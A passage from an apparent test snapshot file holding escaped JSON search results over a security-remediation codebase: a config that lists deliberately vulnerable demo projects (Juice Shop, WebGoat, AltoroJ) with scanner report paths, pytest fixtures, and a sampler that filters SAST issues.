stderr=subprocess.PIPE,\\",\\"lineNumber\\":94},{\\"text\\":\\"            text=True,\\",\\"lineNumber\\":95},{\\"text\\":\\"            env=env,\\",\\"lineNumber\\":96},{\\"text\\":\\"            bufsize=1,\\",\\"lineNumber\\":97},{\\"text\\":\\"            universal_newlines=True,\\",\\"lineNumber\\":98},{\\"text\\":\\"        )\\",\\"lineNumber\\":99},{\\"lineNumber\\":100},{\\"text\\":\\"        # Collect output in real-time\\",\\"lineNumber\\":101},{\\"text\\":\\"        sampler_output = \\\\\\"\\\\\\"\\",\\"lineNumber\\":102},{\\"text\\":\\"        sampler_error = \\\\\\"\\\\\\"\\",\\"lineNumber\\":103},{\\"lineNumber\\":104},{\\"text\\":\\"        try:\\",\\"lineNumber\\":105}]},\\"score\\":0.2901548147201538},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"services/node_general_backend/src/maintenance/try_now.ts\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":55,\\"column\\":1}},\\"contents\\":\\"import path from 'node:path'\\\\n\\\\nimport {\\\\n  Projects,\\\\n  Vendors,\\\\n} from '../servers/vulnerability_report/vuln_report_generates'\\\\n\\\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\\\n\\\\nexport const TRY_NOW_PROJECTS = {\\\\n  [Projects.JuiceShop]: {\\\\n    url: 'https://github.com/juice-shop/juice-shop',\\\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\\\n    },\\\\n  },\\\\n  [Projects.Webgoat]: {\\\\n    url: 'https://github.com/WebGoat/WebGoat',\\\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\\\n    },\\\\n  },\\",\\"originalContents\\":\\"import path from 'node:path'\\\\n\\\\nimport {\\\\n  Projects,\\\\n  Vendors,\\\\n} from '../servers/vulnerability_report/vuln_report_generates'\\\\n\\\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\\\n\\\\nexport const TRY_NOW_PROJECTS = {\\\\n  [Projects.JuiceShop]: {\\\\n    url: 'https://github.com/juice-shop/juice-shop',\\\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\\\n    },\\\\n  },\\\\n  [Projects.Webgoat]: {\\\\n    url: 'https://github.com/WebGoat/WebGoat',\\\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\\\n    reportFiles: {\\\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\\\n    },\\\\n  },\\",\\"detailedLines\\":[{\\"text\\":\\"import path from 'node:path'\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"import {\\",\\"lineNumber\\":3},{\\"text\\":\\"  Projects,\\",\\"lineNumber\\":4},{\\"text\\":\\"  Vendors,\\",\\"lineNumber\\":5},{\\"text\\":\\"} from '../servers/vulnerability_report/vuln_report_generates'\\",\\"lineNumber\\":6},{\\"lineNumber\\":7},{\\"text\\":\\"const DATA_DIR = path.join(__dirname, 'try_now')\\",\\"lineNumber\\":8},{\\"lineNumber\\":9},{\\"text\\":\\"export const TRY_NOW_PROJECTS = {\\",\\"lineNumber\\":10},{\\"text\\":\\"  [Projects.JuiceShop]: {\\",\\"lineNumber\\":11},{\\"text\\":\\"    url: 'https://github.com/juice-shop/juice-shop',\\",\\"lineNumber\\":12},{\\"text\\":\\"    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\",\\"lineNumber\\":13},{\\"text\\":\\"    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\",\\"lineNumber\\":14},{\\"text\\":\\"    reportFiles: {\\",\\"lineNumber\\":15},{\\"text\\":\\"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\",\\"lineNumber\\":16},{\\"text\\":\\"      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\",\\"lineNumber\\":17},{\\"text\\":\\"      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\",\\"lineNumber\\":18},{\\"text\\":\\"      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\",\\"lineNumber\\":19},{\\"text\\":\\"      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\",\\"lineNumber\\":20},{\\"text\\":\\"      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\",\\"lineNumber\\":21},{\\"text\\":\\"      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\",\\"lineNumber\\":22},{\\"text\\":\\"      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\",\\"lineNumber\\":23},{\\"text\\":\\"    },\\",\\"lineNumber\\":24},{\\"text\\":\\"  },\\",\\"lineNumber\\":25},{\\"text\\":\\"  [Projects.Webgoat]: {\\",\\"lineNumber\\":26},{\\"text\\":\\"    url: 'https://github.com/WebGoat/WebGoat',\\",\\"lineNumber\\":27},{\\"text\\":\\"    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\",\\"lineNumber\\":28},{\\"text\\":\\"    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\",\\"lineNumber\\":29},{\\"text\\":\\"    reportFiles: {\\",\\"lineNumber\\":30},{\\"text\\":\\"      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\",\\"lineNumber\\":31},{\\"text\\":\\"      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\",\\"lineNumber\\":32},{\\"text\\":\\"      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\",\\"lineNumber\\":33},{\\"text\\":\\"      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\",\\"lineNumber\\":34},{\\"text\\":\\"      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\",\\"lineNumber\\":35},{\\"text\\":\\"      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\",\\"lineNumber\\":36},{\\"text\\":\\"      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\",\\"lineNumber\\":37},{\\"text\\":\\"      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\",\\"lineNumber\\":38},{\\"text\\":\\"    },\\",\\"lineNumber\\":39},{\\"text\\":\\"  },\\",\\"lineNumber\\":40},{\\"text\\":\\"  [Projects.Altoroj]: {\\",\\"lineNumber\\":41},{\\"text\\":\\"    url: 'https://github.com/HCL-TECH-SOFTWARE/AltoroJ'\\",\\"lineNumber\\":42},{\\"text\\":\\",\\",\\"lineNumber\\":55},{\\"text\\":\\"}\\",\\"lineNumber\\":56}]},\\"score\\":0.2817254960536957},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":180},\\"endPosition\\":{\\"line\\":213,\\"column\\":22}},\\"contents\\":\\"\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef temp_prompt_dir(tmp_path, sample_prompt_content):\\\\n    \\\\\\"\\\\\\"\\\\\\"Create a temporary directory with prompt files for testing.\\\\\\"\\\\\\"\\\\\\"\\\\n    prompt_dir = tmp_path / \\\\\\"prompts\\\\\\"\\\\n    prompt_dir.mkdir()\\\\n\\\\n    # Standard fix prompt\\\\n    standard_prompt = (\\\\n        prompt_dir / \\\\\\"csharp_logging_templates_should_be_constant.user.jinja2\\\\\\"\\\\n    )\\\\n    standard_prompt.write_text(sample_prompt_content)\\\\n\\\\n    # FP detection prompt\\\\n    fp_prompt = (\\\\n        prompt_dir\\\\n        / \\\\\\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\\\\\"\\\\n    )\\\\n    fp_prompt.write_text(sample_prompt_content)\\\\n\\\\n    return str(prompt_dir)\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef temp_prompt_dir(tmp_path, sample_prompt_content):\\\\n    \\\\\\"\\\\\\"\\\\\\"Create a temporary directory with prompt files for testing.\\\\\\"\\\\\\"\\\\\\"\\\\n    prompt_dir = tmp_path / \\\\\\"prompts\\\\\\"\\\\n    prompt_dir.mkdir()\\\\n\\\\n    # Standard fix prompt\\\\n    standard_prompt = (\\\\n        prompt_dir / \\\\\\"csharp_logging_templates_should_be_constant.user.jinja2\\\\\\"\\\\n    )\\\\n    standard_prompt.write_text(sample_prompt_content)\\\\n\\\\n    # FP detection prompt\\\\n    fp_prompt = (\\\\n        prompt_dir\\\\n        / \\\\\\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\\\\\"\\\\n    )\\\\n    fp_prompt.write_text(sample_prompt_content)\\\\n\\\\n    return str(prompt_dir)\\",\\"detailedLines\\":[{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":181},{\\"text\\":\\"def temp_prompt_file(tmp_path, sample_prompt_content):\\",\\"lineNumber\\":182,\\"isSignature\\":true},{\\"lineNumber\\":184},{\\"text\\":\\"    prompt_file.write_text(sample_prompt_content)\\",\\"lineNumber\\":185},{\\"text\\":\\"    return str(prompt_file)\\",\\"lineNumber\\":186,\\"isSignature\\":true},{\\"lineNumber\\":187},{\\"lineNumber\\":188},{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":189},{\\"text\\":\\"def temp_prompt_dir(tmp_path, sample_prompt_content):\\",\\"lineNumber\\":190,\\"isSignature\\":true},{\\"text\\":\\"    \\\\\\"\\\\\\"\\\\\\"Create a temporary directory with prompt files for testing.\\\\\\"\\\\\\"\\\\\\"\\",\\"lineNumber\\":191},{\\"text\\":\\"    prompt_dir = tmp_path / \\\\\\"prompts\\\\\\"\\",\\"lineNumber\\":192},{\\"text\\":\\"    prompt_dir.mkdir()\\",\\"lineNumber\\":193},{\\"lineNumber\\":194},{\\"text\\":\\"    # Standard fix prompt\\",\\"lineNumber\\":195},{\\"text\\":\\"    standard_prompt = (\\",\\"lineNumber\\":196},{\\"text\\":\\"        prompt_dir / \\\\\\"csharp_logging_templates_should_be_constant.user.jinja2\\\\\\"\\",\\"lineNumber\\":197},{\\"text\\":\\"    )\\",\\"lineNumber\\":198},{\\"text\\":\\"    standard_prompt.write_text(sample_prompt_content)\\",\\"lineNumber\\":199},{\\"lineNumber\\":200},{\\"text\\":\\"    # FP detection prompt\\",\\"lineNumber\\":201},{\\"text\\":\\"    fp_prompt = (\\",\\"lineNumber\\":202},{\\"text\\":\\"        prompt_dir\\",\\"lineNumber\\":203},{\\"text\\":\\"        / \\\\\\"csharp_logging_templates_should_be_constant_detect_false_positive.user.jinja2\\\\\\"\\",\\"lineNumber\\":204},{\\"text\\":\\"    )\\",\\"lineNumber\\":205},{\\"text\\":\\"    fp_prompt.write_text(sample_prompt_content)\\",\\"lineNumber\\":206},{\\"lineNumber\\":207},{\\"text\\":\\"    return str(prompt_dir)\\",\\"lineNumber\\":208,\\"isSignature\\":true},{\\"lineNumber\\":209},{\\"lineNumber\\":210},{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":211},{\\"text\\":\\"def mock_fetch_run_feedback():\\",\\"lineNumber\\":212,\\"isSignature\\":true},{\\"text\\":\\"    \\\\\\"\\\\\\"\\\\\\"Mock the fetch_run_feedback function.\\\\\\"\\\\\\"\\\\\\"\\",\\"lineNumber\\":213},{\\"text\\":\\"    return MagicMock()\\",\\"lineNumber\\":214,\\"isSignature\\":true}]},\\"score\\":0.2698521614074707},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"pycommon/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":73}},\\"contents\\":\\"import os\\\\nimport pathlib\\\\n\\\\nimport pytest\\\\nfrom aioresponses import aioresponses\\\\n\\\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\\\\\"\\\\n)\\\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\\\\\"\\\\n)\\\\nTESTS_DIR = pathlib.Path(__file__).parent\\\\n\\\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\\\\\"__tests__/files\\\\\\"\\\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\\\\\"webgoat\\\\\\"\\\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\\\\\"repo.zip\\\\\\"\\\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\\\\\"altoroj.json\\\\\\"\\\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\\\\\"altoroj/sonarqube.json\\\\\\"\\\\nREPO1_ORIGINAL_URL = \\\\\\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\\\\\"\\\\nASSETS_DIR = TESTS_DIR / \\\\\\"assets\\\\\\"\\\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\\\\\"clients/cli\\\\\\"\\\\n\\\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\\\\\"assets/sample.java\\\\\\"\\\\nSAMPLE_JSP_FILE = TESTS_DIR / \\\\\\"assets/sample.jsp\\\\\\"\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef aiohttp_session():\\\\n    with aioresponses() as session:\\\\n        yield session\\",\\"originalContents\\":\\"import os\\\\nimport pathlib\\\\n\\\\nimport pytest\\\\nfrom aioresponses import aioresponses\\\\n\\\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\\\\\"\\\\n)\\\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\\\\\"\\\\n)\\\\nTESTS_DIR = pathlib.Path(__file__).parent\\\\n\\\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\\\\\"__tests__/files\\\\\\"\\\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\\\\\"webgoat\\\\\\"\\\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\\\\\"repo.zip\\\\\\"\\\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\\\\\"altoroj.json\\\\\\"\\\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\\\\\"altoroj/sonarqube.json\\\\\\"\\\\nREPO1_ORIGINAL_URL = \\\\\\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\\\\\"\\\\nASSETS_DIR = TESTS_DIR / \\\\\\"assets\\\\\\"\\\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\\\\\"clients/cli\\\\\\"\\\\n\\\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\\\\\"assets/sample.java\\\\\\"\\\\nSAMPLE_JSP_FILE = TESTS_DIR / \\\\\\"assets/sample.jsp\\\\\\"\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef aiohttp_session():\\\\n    with aioresponses() as session:\\\\n        yield session\\",\\"detailedLines\\":[{\\"text\\":\\"import os\\",\\"lineNumber\\":1},{\\"text\\":\\"import pathlib\\",\\"lineNumber\\":2},{\\"lineNumber\\":3},{\\"text\\":\\"import pytest\\",\\"lineNumber\\":4},{\\"text\\":\\"from aioresponses import aioresponses\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"ROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\",\\"lineNumber\\":7},{\\"text\\":\\"WEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\",\\"lineNumber\\":8},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":9},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\\\\\"\\",\\"lineNumber\\":10},{\\"text\\":\\")\\",\\"lineNumber\\":11},{\\"text\\":\\"WEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\",\\"lineNumber\\":12},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":13},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\\\\\"\\",\\"lineNumber\\":14},{\\"text\\":\\")\\",\\"lineNumber\\":15},{\\"text\\":\\"JUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\",\\"lineNumber\\":16},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":17},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\\\\\"\\",\\"lineNumber\\":18},{\\"text\\":\\")\\",\\"lineNumber\\":19},{\\"text\\":\\"JUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\",\\"lineNumber\\":20},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":21},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\\\\\"\\",\\"lineNumber\\":22},{\\"text\\":\\")\\",\\"lineNumber\\":23},{\\"text\\":\\"TESTS_DIR = pathlib.Path(__file__).parent\\",\\"lineNumber\\":24},{\\"lineNumber\\":25},{\\"text\\":\\"TEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\\\\\"__tests__/files\\\\\\"\\",\\"lineNumber\\":26},{\\"text\\":\\"TEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\\\\\"webgoat\\\\\\"\\",\\"lineNumber\\":27},{\\"text\\":\\"REPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\\\\\"repo.zip\\\\\\"\\",\\"lineNumber\\":28},{\\"text\\":\\"REPO1_VUL_REPORT = TEST_DATA_SOURCE / \\\\\\"altoroj.json\\\\\\"\\",\\"lineNumber\\":29},{\\"text\\":\\"REPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\\\\\"altoroj/sonarqube.json\\\\\\"\\",\\"lineNumber\\":30},{\\"text\\":\\"REPO1_ORIGINAL_URL = \\\\\\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\\\\\"\\",\\"lineNumber\\":31},{\\"text\\":\\"ASSETS_DIR = TESTS_DIR / \\\\\\"assets\\\\\\"\\",\\"lineNumber\\":32},{\\"text\\":\\"BUGSY_SOURCE = TESTS_DIR.parent.parent / \\\\\\"clients/cli\\\\\\"\\",\\"lineNumber\\":33},{\\"lineNumber\\":34},{\\"text\\":\\"SAMPLE_JAVA_FILE = TESTS_DIR / \\\\\\"assets/sample.java\\\\\\"\\",\\"lineNumber\\":35},{\\"text\\":\\"SAMPLE_JSP_FILE = TESTS_DIR / \\\\\\"assets/sample.jsp\\\\\\"\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"lineNumber\\":38},{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":39},{\\"text\\":\\"def aiohttp_session():\\",\\"lineNumber\\":40,\\"isSignature\\":true},{\\"text\\":\\"    with aioresponses() as session:\\",\\"lineNumber\\":41},{\\"text\\":\\"        yield session\\",\\"lineNumber\\":42,\\"isSignature\\":true},{\\"lineNumber\\":43},{\\"lineNumber\\":44},{\\"text\\":\\"@pytest.fixture(autouse=True, scope=\\\\\\"session\\\\\\")\\",\\"lineNumber\\":45},{\\"text\\":\\"def mock_env_values_for_py_common():\\",\\"lineNumber\\":46,\\"isSignature\\":true},{\\"text\\":\\"    os.environ[\\\\\\"AWS_S3_ACCESS_KEY_ID\\\\\\"] = \\\\\\"DUMMY_AWS_S3_ACCESS_KEY_ID\\\\\\"\\",\\"lineNumber\\":47}]},\\"score\\":0.2692480683326721},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":339,\\"column\\":9},\\"endPosition\\":{\\"line\\":465}},\\"contents\\":\\"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\\\n\\\\n    ...\\\\n\\\\n    else:\\\\n        for issue in customer_issues:\\\\n            if (\\\\n                issue.raw_issue_type in config.sast_issue_types\\\\n                and issue.raw_language in config.sast_issue_languages\\\\n                and len(samples) <= (config.max_sample_count / 2)\\\\n            ):\\\\n                if not issue.fingerprint_hash:\\\\n                    print(\\\\n                        f\\\\\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\\\\\"\\\\n                    )\\\\n                    continue\\\\n\\\\n                samples.append(\\\\n                    Sample(\\\\n                        issue=issue,\\\\n                        report=report,\\\\n                        report_path=config.customer_report_path,\\\\n                        source_archive_path=config.customer_source_archive_path,\\\\n                        is_public=False,\\\\n                    )\\\\n                )\\\\n\\\\n    print(f\\\\\\"Found {len(samples)} issues from the customer report\\\\\\")\\\\n    return samples\\",\\"originalContents\\":\\"\\\\n    else:\\\\n        for issue in customer_issues:\\\\n            if (\\\\n                issue.raw_issue_type in config.sast_issue_types\\\\n                and issue.raw_language in config.sast_issue_languages\\\\n                and len(samples) <= (config.max_sample_count / 2)\\\\n            ):\\\\n                if not issue.fingerprint_hash:\\\\n                    print(\\\\n                        f\\\\\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\\\\\"\\\\n                    )\\\\n                    continue\\\\n\\\\n                samples.append(\\\\n                    Sample(\\\\n                        issue=issue,\\\\n                        report=report,\\\\n                        report_path=config.customer_report_path,\\\\n                        source_archive_path=config.customer_source_archive_path,\\\\n                        is_public=False,\\\\n                    )\\\\n                )\\\\n\\\\n    print(f\\\\\\"Found {len(samples)} issues from the customer report\\\\\\")\\\\n    return samples\\",\\"detailedLines\\":[{\\"text\\":\\"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":343,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":344},{\\"lineNumber\\":371},{\\"text\\":\\"                    is_public=False,\\",\\"lineNumber\\":372},{\\"text\\":\\"                )\\",\\"lineNumber\\":373},{\\"text\\":\\"            )\\",\\"lineNumber\\":374},{\\"text\\":\\"    else:\\",\\"lineNumber\\":375},{\\"text\\":\\"        for issue in customer_issues:\\",\\"lineNumber\\":376},{\\"text\\":\\"            if (\\",\\"lineNumber\\":377},{\\"text\\":\\"                issue.raw_issue_type in config.sast_issue_types\\",\\"lineNumber\\":378},{\\"text\\":\\"                and issue.raw_language in config.sast_issue_languages\\",\\"lineNumber\\":379},{\\"text\\":\\"                and len(samples) <= (config.max_sample_count / 2)\\",\\"lineNumber\\":380},{\\"text\\":\\"            ):\\",\\"lineNumber\\":381},{\\"text\\":\\"                if not issue.fingerprint_hash:\\",\\"lineNumber\\":382},{\\"text\\":\\"                    print(\\",\\"lineNumber\\":383},{\\"text\\":\\"                        f\\\\\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\\\\\"\\",\\"lineNumber\\":384},{\\"text\\":\\"                    )\\",\\"lineNumber\\":385},{\\"text\\":\\"                    continue\\",\\"lineNumber\\":386},{\\"lineNumber\\":387},{\\"text\\":\\"                samples.append(\\",\\"lineNumber\\":388},{\\"text\\":\\"                    Sample(\\",\\"lineNumber\\":389},{\\"text\\":\\"                        issue=issue,\\",\\"lineNumber\\":390},{\\"text\\":\\"                        report=report,\\",\\"lineNumber\\":391},{\\"text\\":\\"                        report_path=config.customer_report_path,\\",\\"lineNumber\\":392},{\\"text\\":\\"                        source_archive_path=config.customer_source_archive_path,\\",\\"lineNumber\\":393},{\\"text\\":\\"                        is_public=False,\\",\\"lineNumber\\":394},{\\"text\\":\\"                    )\\",\\"lineNumber\\":395},{\\"text\\":\\"                )\\",\\"lineNumber\\":396},{\\"lineNumber\\":397},{\\"text\\":\\"    print(f\\\\\\"Found {len(samples)} issues from the customer report\\\\\\")\\",\\"lineNumber\\":398},{\\"text\\":\\"    return samples\\",\\"lineNumber\\":399,\\"isSignature\\":true},{\\"lineNumber\\":400},{\\"lineNumber\\":401},{\\"text\\":\\"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":402,\\"isSignature\\":true},{\\"text\\":\\"    samples = []\\",\\"lineNumber\\":403}]},\\"score\\":0.2687819004058838}]}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-41 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bf6b0eea-d94d-4c87-acc7-a898f080cc4c",
